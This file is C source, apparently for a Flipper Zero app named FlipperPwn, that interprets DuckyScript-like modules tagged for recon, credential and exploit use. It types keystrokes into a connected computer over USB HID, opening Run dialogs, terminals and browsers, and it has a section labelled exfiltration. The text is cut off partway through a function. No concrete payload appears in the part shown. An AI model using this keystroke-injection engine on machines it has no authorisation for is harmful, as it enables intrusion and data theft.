/**
 * payload_engine.c — FlipperPwn payload engine
 *
 * Handles .fpwn module scanning, option loading, and DuckyScript-like
 * payload execution over USB HID.
 *
 * .fpwn file format:
 *   NAME <module name>
 *   DESCRIPTION <description text>
 *   CATEGORY <recon|credential|exploit|post>
 *   PLATFORMS <WIN,MAC,LINUX>
 *   OPTION <name> <default> "<description>"
 *   PLATFORM WIN
 *   <ducky commands>
 *   PLATFORM MAC
 *   <ducky commands>
 *   PLATFORM LINUX
 *   <ducky commands>
 */

#include "flipperpwn.h"
#include "wifi_uart.h"
#include "marauder.h"
#include <furi_hal_usb_cdc.h>
#include <string.h>
#include <stdlib.h>

#define TAG "FPwn"

/* =========================================================================
 * USB CDC exfiltration — ISR-safe flags for the rx_ep_callback
 * ========================================================================= */
static volatile bool s_cdc_rx_pending = false;

static void fpwn_cdc_rx_callback(void* context) {
    UNUSED(context);
    s_cdc_rx_pending = true;
}

static void fpwn_cdc_state_callback(void* context, CdcState state) {
    UNUSED(context);
    UNUSED(state);
}

/* Persists the most-recently executed non-REPEAT command for REPEAT <n> */
static char s_last_command[FPWN_MAX_LINE_LEN];

/* Per-run inter-command delay set by DEFAULTDELAY / DEFAULT_DELAY */
static uint32_t s_default_delay_ms = 0;

/* INJECT nesting depth guard (max 4 levels to keep stack usage safe) */
static uint8_t s_inject_depth = 0;

/* =========================================================================
 * Runtime variables — set via VAR/SET, substituted via $NAME in STRING/STRINGLN
 * ========================================================================= */
#define FPWN_MAX_VARS     16
#define FPWN_VAR_NAME_LEN 32
#define FPWN_VAR_VAL_LEN  128

typedef struct {
    char name[FPWN_VAR_NAME_LEN];
    char value[FPWN_VAR_VAL_LEN];
} FPwnVar;

static FPwnVar s_vars[FPWN_MAX_VARS];
static uint32_t s_var_count = 0;

/* Look up a variable by name; returns its value or NULL. */
static const char* fpwn_var_get(const char* name) {
    for(uint32_t i = 0; i < s_var_count; i++) {
        if(strcmp(s_vars[i].name, name) == 0) return s_vars[i].value;
    }
    return NULL;
}

/* Set (or create) a variable. */
static void fpwn_var_set(const char* name, const char* value) {
    /* Update existing */
    for(uint32_t i = 0; i < s_var_count; i++) {
        if(strcmp(s_vars[i].name, name) == 0) {
            strncpy(s_vars[i].value, value, FPWN_VAR_VAL_LEN - 1);
            s_vars[i].value[FPWN_VAR_VAL_LEN - 1] = '\0';
            return;
        }
    }
    /* Create new */
    if(s_var_count < FPWN_MAX_VARS) {
        strncpy(s_vars[s_var_count].name, name, FPWN_VAR_NAME_LEN - 1);
        s_vars[s_var_count].name[FPWN_VAR_NAME_LEN - 1] = '\0';
        strncpy(s_vars[s_var_count].value, value, FPWN_VAR_VAL_LEN - 1);
        s_vars[s_var_count].value[FPWN_VAR_VAL_LEN - 1] = '\0';
        s_var_count++;
    }
}

/* Perform $VARIABLE substitution on a string.  Writes result to dst.
 * Variables are delimited by $NAME where NAME is [A-Za-z0-9_]+. */
static void fpwn_var_substitute(const char* src, char* dst, size_t dst_size) {
    if(dst_size == 0) return;
    size_t di = 0;
    const char* p = src;

    while(*p && di < dst_size - 1) {
        if(*p == '$') {
            const char* start = p + 1;
            const char* end = start;
            while((*end >= 'A' && *end <= 'Z') || (*end >= 'a' && *end <= 'z') ||
                  (*end >= '0' && *end <= '9') || *end == '_') {
                end++;
            }
            if(end > start) {
                char var_name[FPWN_VAR_NAME_LEN];
                size_t nlen = (size_t)(end - start);
                if(nlen > FPWN_VAR_NAME_LEN - 1) nlen = FPWN_VAR_NAME_LEN - 1;
                memcpy(var_name, start, nlen);
                var_name[nlen] = '\0';
                const char* val = fpwn_var_get(var_name);
                if(val) {
                    size_t vlen = strlen(val);
                    size_t space = dst_size - 1 - di;
                    size_t copy = vlen < space ? vlen : space;
                    memcpy(dst + di, val, copy);
                    di += copy;
                    p = end;
                    continue;
                }
            }
        }
        dst[di++] = *p++;
    }
    dst[di] = '\0';
}

/* =========================================================================
 * Internal helpers
 * ========================================================================= */

/**
 * Read one line from a storage file into buf (max buf_size bytes).
 * Strips the trailing newline. Returns number of chars written (0 at EOF).
 */
static size_t fpwn_read_line(File* file, char* buf, size_t buf_size) {
    size_t pos = 0;
    uint8_t byte;

    while(pos < buf_size - 1) {
        uint16_t read = storage_file_read(file, &byte, 1);
        if(read == 0) break; /* EOF */
        if(byte == '\r') continue; /* skip CR in CRLF */
        if(byte == '\n') break;
        buf[pos++] = (char)byte;
    }

    buf[pos] = '\0';
    return pos;
}

/**
 * Trim leading and trailing whitespace in-place.
 * Returns pointer to the first non-space character.
 */
static char* fpwn_trim(char* s) {
    while(*s == ' ' || *s == '\t')
        s++;
    size_t len = strlen(s);
    while(len > 0 && (s[len - 1] == ' ' || s[len - 1] == '\t')) {
        s[--len] = '\0';
    }
    return s;
}

/**
 * Parse the PLATFORMS header value ("WIN,MAC,LINUX") into a bitmask.
 */
static uint8_t fpwn_parse_platforms(const char* val) {
    uint8_t mask = 0;
    /* Work on a local copy so we can tokenise without modifying the arg */
    char buf[64];
    strncpy(buf, val, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* p = buf;
    while(*p) {
        /* Find the next comma or end of string */
        char* comma = strchr(p, ',');
        if(comma) *comma = '\0';
        char* t = fpwn_trim(p);
        if(strcmp(t, "WIN") == 0)
            mask |= FPwnPlatformWindows;
        else if(strcmp(t, "MAC") == 0)
            mask |= FPwnPlatformMac;
        else if(strcmp(t, "LINUX") == 0)
            mask |= FPwnPlatformLinux;
        if(comma)
            p = comma + 1;
        else
            break;
    }
    return mask;
}

/**
 * Parse the CATEGORY header value into the enum.
 */
static FPwnCategory fpwn_parse_category(const char* val) {
    if(strcmp(val, "recon") == 0) return FPwnCategoryRecon;
    if(strcmp(val, "credential") == 0) return FPwnCategoryCredential;
    if(strcmp(val, "exploit") == 0) return FPwnCategoryExploit;
    if(strcmp(val, "post") == 0) return FPwnCategoryPost;
    return FPwnCategoryRecon; /* safe default */
}

/* =========================================================================
 * HID key typing
 * ========================================================================= */

/**
 * Map a single ASCII character to a HID keycode + shift flag.
 * Returns false if the character cannot be mapped.
 */
static bool fpwn_char_to_hid(char c, uint16_t* keycode, bool* need_shift) {
    *need_shift = false;

    /* Lowercase letters */
    if(c >= 'a' && c <= 'z') {
        *keycode = HID_KEYBOARD_A + (uint16_t)(c - 'a');
        return true;
    }
    /* Uppercase letters */
    if(c >= 'A' && c <= 'Z') {
        *keycode = HID_KEYBOARD_A + (uint16_t)(c - 'A');
        *need_shift = true;
        return true;
    }
    /* Digits */
    if(c >= '1' && c <= '9') {
        *keycode = HID_KEYBOARD_1 + (uint16_t)(c - '1');
        return true;
    }
    if(c == '0') {
        *keycode = HID_KEYBOARD_0;
        return true;
    }

    /* Space and common punctuation */
    switch(c) {
    case ' ':
        *keycode = HID_KEYBOARD_SPACEBAR;
        return true;
    case '\t':
        *keycode = HID_KEYBOARD_TAB;
        return true;
    case '\n':
        *keycode = HID_KEYBOARD_RETURN;
        return true;
    case '-':
        *keycode = HID_KEYBOARD_MINUS;
        return true;
    case '_':
        *keycode = HID_KEYBOARD_MINUS;
        *need_shift = true;
        return true;
    case '=':
        *keycode = HID_KEYBOARD_EQUAL_SIGN;
        return true;
    case '+':
        *keycode = HID_KEYBOARD_EQUAL_SIGN;
        *need_shift = true;
        return true;
    case '[':
        *keycode = HID_KEYBOARD_OPEN_BRACKET;
        return true;
    case '{':
        *keycode = HID_KEYBOARD_OPEN_BRACKET;
        *need_shift = true;
        return true;
    case ']':
        *keycode = HID_KEYBOARD_CLOSE_BRACKET;
        return true;
    case '}':
        *keycode = HID_KEYBOARD_CLOSE_BRACKET;
        *need_shift = true;
        return true;
    case '\\':
        *keycode = HID_KEYBOARD_BACKSLASH;
        return true;
    case '|':
        *keycode = HID_KEYBOARD_BACKSLASH;
        *need_shift = true;
        return true;
    case ';':
        *keycode = HID_KEYBOARD_SEMICOLON;
        return true;
    case ':':
        *keycode = HID_KEYBOARD_SEMICOLON;
        *need_shift = true;
        return true;
    case '\'':
        *keycode = HID_KEYBOARD_APOSTROPHE;
        return true;
    case '"':
        *keycode = HID_KEYBOARD_APOSTROPHE;
        *need_shift = true;
        return true;
    case '`':
        *keycode = HID_KEYBOARD_GRAVE_ACCENT;
        return true;
    case '~':
        *keycode = HID_KEYBOARD_GRAVE_ACCENT;
        *need_shift = true;
        return true;
    case ',':
        *keycode = HID_KEYBOARD_COMMA;
        return true;
    case '<':
        *keycode = HID_KEYBOARD_COMMA;
        *need_shift = true;
        return true;
    case '.':
        *keycode = HID_KEYBOARD_DOT;
        return true;
    case '>':
        *keycode = HID_KEYBOARD_DOT;
        *need_shift = true;
        return true;
    case '/':
        *keycode = HID_KEYBOARD_SLASH;
        return true;
    case '?':
        *keycode = HID_KEYBOARD_SLASH;
        *need_shift = true;
        return true;
    case '!':
        *keycode = HID_KEYBOARD_1;
        *need_shift = true;
        return true;
    case '@':
        *keycode = HID_KEYBOARD_2;
        *need_shift = true;
        return true;
    case '#':
        *keycode = HID_KEYBOARD_3;
        *need_shift = true;
        return true;
    case '$':
        *keycode = HID_KEYBOARD_4;
        *need_shift = true;
        return true;
    case '%':
        *keycode = HID_KEYBOARD_5;
        *need_shift = true;
        return true;
    case '^':
        *keycode = HID_KEYBOARD_6;
        *need_shift = true;
        return true;
    case '&':
        *keycode = HID_KEYBOARD_7;
        *need_shift = true;
        return true;
    case '*':
        *keycode = HID_KEYBOARD_8;
        *need_shift = true;
        return true;
    case '(':
        *keycode = HID_KEYBOARD_9;
        *need_shift = true;
        return true;
    case ')':
        *keycode = HID_KEYBOARD_0;
        *need_shift = true;
        return true;
    default:
        return false;
    }
}

/** Type a single ASCII character via HID press/release. */
static void fpwn_type_char(char c) {
    uint16_t keycode;
    bool need_shift;

    if(!fpwn_char_to_hid(c, &keycode, &need_shift)) {
        FURI_LOG_W(TAG, "No HID mapping for char 0x%02x", (uint8_t)c);
        return;
    }

    if(need_shift) {
        furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | keycode);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | keycode);
    } else {
        furi_hal_hid_kb_press(keycode);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(keycode);
    }
    /* Small inter-key delay to avoid dropped keystrokes */
    furi_delay_ms(5);
}

/** Type a full NUL-terminated string via HID. */
static void fpwn_type_string(const char* s) {
    while(*s) {
        fpwn_type_char(*s);
        s++;
    }
}

/**
 * Map a named key string (e.g. "a", "RETURN", "F5") to a HID keycode.
 * Returns 0 if not found.
 */
static uint16_t fpwn_named_key(const char* name) {
    /* Single character */
    if(name[0] != '\0' && name[1] == '\0') {
        uint16_t kc;
        bool shift;
        if(fpwn_char_to_hid(name[0], &kc, &shift)) return kc;
    }
    /* Named keys */
    if(strcmp(name, "ENTER") == 0 || strcmp(name, "RETURN") == 0) return HID_KEYBOARD_RETURN;
    if(strcmp(name, "TAB") == 0) return HID_KEYBOARD_TAB;
    if(strcmp(name, "ESCAPE") == 0 || strcmp(name, "ESC") == 0) return HID_KEYBOARD_ESCAPE;
    if(strcmp(name, "SPACE") == 0) return HID_KEYBOARD_SPACEBAR;
    if(strcmp(name, "BACKSPACE") == 0) return HID_KEYBOARD_DELETE;
    if(strcmp(name, "DELETE") == 0) return HID_KEYBOARD_DELETE_FORWARD;
    if(strcmp(name, "HOME") == 0) return HID_KEYBOARD_HOME;
    if(strcmp(name, "END") == 0) return HID_KEYBOARD_END;
    if(strcmp(name, "PAGEUP") == 0) return HID_KEYBOARD_PAGE_UP;
    if(strcmp(name, "PAGEDOWN") == 0) return HID_KEYBOARD_PAGE_DOWN;
    if(strcmp(name, "UP") == 0) return HID_KEYBOARD_UP_ARROW;
    if(strcmp(name, "DOWN") == 0) return HID_KEYBOARD_DOWN_ARROW;
    if(strcmp(name, "LEFT") == 0) return HID_KEYBOARD_LEFT_ARROW;
    if(strcmp(name, "RIGHT") == 0) return HID_KEYBOARD_RIGHT_ARROW;
    /* Function keys */
    if(strcmp(name, "F1") == 0) return HID_KEYBOARD_F1;
    if(strcmp(name, "F2") == 0) return HID_KEYBOARD_F2;
    if(strcmp(name, "F3") == 0) return HID_KEYBOARD_F3;
    if(strcmp(name, "F4") == 0) return HID_KEYBOARD_F4;
    if(strcmp(name, "F5") == 0) return HID_KEYBOARD_F5;
    if(strcmp(name, "F6") == 0) return HID_KEYBOARD_F6;
    if(strcmp(name, "F7") == 0) return HID_KEYBOARD_F7;
    if(strcmp(name, "F8") == 0) return HID_KEYBOARD_F8;
    if(strcmp(name, "F9") == 0) return HID_KEYBOARD_F9;
    if(strcmp(name, "F10") == 0) return HID_KEYBOARD_F10;
    if(strcmp(name, "F11") == 0) return HID_KEYBOARD_F11;
    if(strcmp(name, "F12") == 0) return HID_KEYBOARD_F12;
    /* Extended keys */
    if(strcmp(name, "MENU") == 0 || strcmp(name, "APP") == 0) return HID_KEYBOARD_APPLICATION;
    if(strcmp(name, "PRINTSCREEN") == 0) return HID_KEYBOARD_PRINT_SCREEN;
    if(strcmp(name, "INSERT") == 0) return HID_KEYBOARD_INSERT;
    if(strcmp(name, "PAUSE") == 0) return HID_KEYBOARD_PAUSE;
    return 0;
}

/* =========================================================================
 * Template substitution
 * ========================================================================= */

/**
 * Perform in-place {{OPTION_NAME}} substitution on `src`, writing to `dst`
 * (dst_size bytes available). Looks up option values from the active options.
 */
static void fpwn_substitute(
    const char* src,
    char* dst,
    size_t dst_size,
    const FPwnOption* options,
    uint8_t option_count) {
    if(dst_size == 0) return;
    size_t di = 0; /* write cursor */
    const char* p = src;

    while(*p && di < dst_size - 1) {
        /* Look for opening {{ */
        if(p[0] == '{' && p[1] == '{') {
            const char* start = p + 2;
            const char* end = strstr(start, "}}");
            if(end) {
                /* Extract option name */
                size_t name_len = (size_t)(end - start);
                if(name_len < FPWN_OPT_NAME_LEN) {
                    char opt_name[FPWN_OPT_NAME_LEN];
                    memcpy(opt_name, start, name_len);
                    opt_name[name_len] = '\0';

                    /* Look up the option value */
                    const char* replacement = NULL;
                    for(uint8_t i = 0; i < option_count; i++) {
                        if(strcmp(options[i].name, opt_name) == 0) {
                            replacement = options[i].value;
                            break;
                        }
                    }

                    if(replacement) {
                        size_t rlen = strlen(replacement);
                        size_t space = dst_size - 1 - di;
                        size_t copy = rlen < space ? rlen : space;
                        memcpy(dst + di, replacement, copy);
                        di += copy;
                    } else {
                        /* Unknown placeholder — copy verbatim */
                        size_t raw_len = name_len + 4; /* {{ + name + }} */
                        size_t space = dst_size - 1 - di;
                        size_t copy = raw_len < space ? raw_len : space;
                        memcpy(dst + di, p, copy);
                        di += copy;
                    }
                    p = end + 2;
                    continue;
                }
            }
        }
        dst[di++] = *p++;
    }
    dst[di] = '\0';
}

/* =========================================================================
 * Command execution
 * ========================================================================= */

/**
 * Execute a single substituted DuckyScript-like command line.
 * `app` is required for WiFi commands; all non-WiFi commands ignore it.
 */
static void fpwn_exec_command(const char* line, FPwnApp* app) {
    /* Skip empty lines and comments (# and REM) */
    if(line[0] == '\0' || line[0] == '#') return;
    if(strncmp(line, "REM ", 4) == 0 || strcmp(line, "REM") == 0) return;

    /* Track last command for REPEAT (must happen before any early return) */
    if(strncmp(line, "REPEAT ", 7) != 0) {
        strncpy(s_last_command, line, FPWN_MAX_LINE_LEN - 1);
        s_last_command[FPWN_MAX_LINE_LEN - 1] = '\0';
    }

    /* ---- REPEAT <n> ---- */
    if(strncmp(line, "REPEAT ", 7) == 0) {
        int n = atoi(line + 7);
        /* Guard: s_last_command must not itself be a REPEAT to avoid recursion */
        if(n > 0 && s_last_command[0] != '\0' && strncmp(s_last_command, "REPEAT ", 7) != 0) {
            for(int i = 0; i < n; i++) {
                fpwn_exec_command(s_last_command, app);
            }
        }
        return;
    }

    /* ---- DEFAULTDELAY / DEFAULT_DELAY ---- */
    if(strncmp(line, "DEFAULTDELAY ", 13) == 0 || strncmp(line, "DEFAULT_DELAY ", 14) == 0) {
        const char* val = (line[7] == 'D') ? line + 14 : line + 13;
        s_default_delay_ms = (uint32_t)atoi(val);
        return;
    }

    /* ---- IF_CONNECTED — skip to END_IF if ESP32 not connected ---- */
    if(strcmp(line, "IF_CONNECTED") == 0) {
        /* This is handled at the execution loop level, not here.
         * If we reach here, it means the conditional is satisfied. */
        return;
    }
    if(strcmp(line, "END_IF") == 0) {
        /* Matched end — noop, handled at the loop level. */
        return;
    }

    /* ---- VAR $name = value  /  SET $name = value ---- */
    /* Supports arithmetic: VAR $X = $Y + 1, VAR $X = $Y - 3, etc. */
    if(strncmp(line, "VAR ", 4) == 0 || strncmp(line, "SET ", 4) == 0) {
        const char* rest = line + 4;
        /* Skip leading $ if present */
        if(*rest == '$') rest++;
        /* Find '=' separator */
        const char* eq = strchr(rest, '=');
        if(eq) {
            char vname[FPWN_VAR_NAME_LEN];
            size_t nlen = (size_t)(eq - rest);
            /* Trim trailing spaces from name */
            while(nlen > 0 && rest[nlen - 1] == ' ')
                nlen--;
            if(nlen > FPWN_VAR_NAME_LEN - 1) nlen = FPWN_VAR_NAME_LEN - 1;
            memcpy(vname, rest, nlen);
            vname[nlen] = '\0';
            /* Value is everything after '=' (trimmed) */
            const char* vval = eq + 1;
            while(*vval == ' ')
                vval++;

            /* Check for arithmetic: $VAR op literal  (e.g. "$X + 1") */
            if(vval[0] == '$') {
                const char* vs = vval + 1;
                const char* ve = vs;
                while((*ve >= 'A' && *ve <= 'Z') || (*ve >= 'a' && *ve <= 'z') ||
                      (*ve >= '0' && *ve <= '9') || *ve == '_')
                    ve++;
                char ref_name[FPWN_VAR_NAME_LEN];
                size_t rl = (size_t)(ve - vs);
                if(rl > FPWN_VAR_NAME_LEN - 1) rl = FPWN_VAR_NAME_LEN - 1;
                memcpy(ref_name, vs, rl);
                ref_name[rl] = '\0';

                const char* op = ve;
                while(*op == ' ')
                    op++;

                char op_char = *op;
                if(op_char == '+' || op_char == '-' || op_char == '*' || op_char == '/' ||
                   op_char == '%') {
                    const char* num_start = op + 1;
                    while(*num_start == ' ')
                        num_start++;

                    const char* ref_val = fpwn_var_get(ref_name);
                    int32_t lhs = ref_val ? (int32_t)atoi(ref_val) : 0;
                    int32_t rhs = (int32_t)atoi(num_start);
                    int32_t result = 0;
                    switch(op_char) {
                    case '+':
                        result = lhs + rhs;
                        break;
                    case '-':
                        result = lhs - rhs;
                        break;
                    case '*':
                        result = lhs * rhs;
                        break;
                    case '/':
                        result = (rhs != 0) ? lhs / rhs : 0;
                        break;
                    case '%':
                        result = (rhs != 0) ? lhs % rhs : 0;
                        break;
                    }
                    char result_buf[16];
                    snprintf(result_buf, sizeof(result_buf), "%ld", (long)result);
                    fpwn_var_set(vname, result_buf);
                    FURI_LOG_D(TAG, "VAR %s = %ld (arith)", vname, (long)result);
                    return;
                }
            }

            /* Plain string assignment — substitute variables in value */
            char expanded[FPWN_VAR_VAL_LEN];
            fpwn_var_substitute(vval, expanded, sizeof(expanded));
            fpwn_var_set(vname, expanded);
            FURI_LOG_D(TAG, "VAR %s = %s", vname, expanded);
        }
        return;
    }

    /* ---- DELAY / SLEEP ---- */
    if(strncmp(line, "DELAY ", 6) == 0) {
        uint32_t ms = (uint32_t)atoi(line + 6);
        furi_delay_ms(ms);
        return;
    }
    if(strncmp(line, "SLEEP ", 6) == 0) {
        uint32_t ms = (uint32_t)atoi(line + 6);
        furi_delay_ms(ms);
        return;
    }

    /* ---- Clipboard / editing shortcuts (OS-aware: Ctrl vs Cmd) ---- */
    if(strcmp(line, "SELECT_ALL") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_A);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_A);
        return;
    }
    if(strcmp(line, "COPY") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_C);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_C);
        return;
    }
    if(strcmp(line, "PASTE") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_V);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_V);
        return;
    }
    if(strcmp(line, "CUT") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_X);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_X);
        return;
    }
    if(strcmp(line, "UNDO") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_Z);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_Z);
        return;
    }
    if(strcmp(line, "REDO") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSMac) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_Z);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_Z);
        } else {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | HID_KEYBOARD_Y);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | HID_KEYBOARD_Y);
        }
        return;
    }
    if(strcmp(line, "FIND") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_F);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_F);
        return;
    }
    if(strcmp(line, "SAVE") == 0) {
        uint16_t mod = (fpwn_effective_os(app) == FPwnOSMac) ? KEY_MOD_LEFT_GUI :
                                                               KEY_MOD_LEFT_CTRL;
        furi_hal_hid_kb_press(mod | HID_KEYBOARD_S);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(mod | HID_KEYBOARD_S);
        return;
    }

    /* ---- CLOSE_WINDOW — OS-aware window close ---- */
    if(strcmp(line, "CLOSE_WINDOW") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSMac) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_W);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_W);
        } else {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | HID_KEYBOARD_F4);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | HID_KEYBOARD_F4);
        }
        return;
    }

    /* ---- TASK_MANAGER — OS-aware task manager/activity monitor ---- */
    if(strcmp(line, "TASK_MANAGER") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Ctrl+Shift+Esc */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_ESCAPE);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_ESCAPE);
        } else if(os == FPwnOSMac) {
            /* Cmd+Space → Activity Monitor */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("Activity Monitor");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1400);
        } else {
            /* xterm || gnome-system-monitor */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
            fpwn_type_string("top");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        }
        furi_delay_ms(500);
        return;
    }

    /* ---- OPEN_BROWSER — OS-aware default browser ---- */
    if(strcmp(line, "OPEN_BROWSER") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Win+R → "start msedge" opens Edge (default browser fallback) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(800);
            fpwn_type_string("start msedge");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(2000);
        } else if(os == FPwnOSMac) {
            /* Spotlight → Safari */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("Safari");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(2000);
        } else {
            /* xdg-open about:blank opens the default browser */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
            fpwn_type_string("xdg-open about:blank");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(2000);
        }
        return;
    }

    /* ---- BROWSE_URL <url> — open a URL in the default browser (OS-aware) ---- */
    if(strncmp(line, "BROWSE_URL ", 11) == 0) {
        char expanded[FPWN_MAX_LINE_LEN];
        fpwn_var_substitute(line + 11, expanded, sizeof(expanded));
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(800);
            fpwn_type_string(expanded);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        } else if(os == FPwnOSMac) {
            /* open <url> via Terminal — works with any URL scheme */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("Terminal");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1400);
            fpwn_type_string("open ");
            fpwn_type_string(expanded);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        } else {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
            fpwn_type_string("xdg-open ");
            fpwn_type_string(expanded);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        }
        furi_delay_ms(1500);
        return;
    }

    /* ---- OPEN_NOTEPAD — open a text editor (OS-aware) ---- */
    if(strcmp(line, "OPEN_NOTEPAD") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(800);
            fpwn_type_string("notepad");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        } else if(os == FPwnOSMac) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
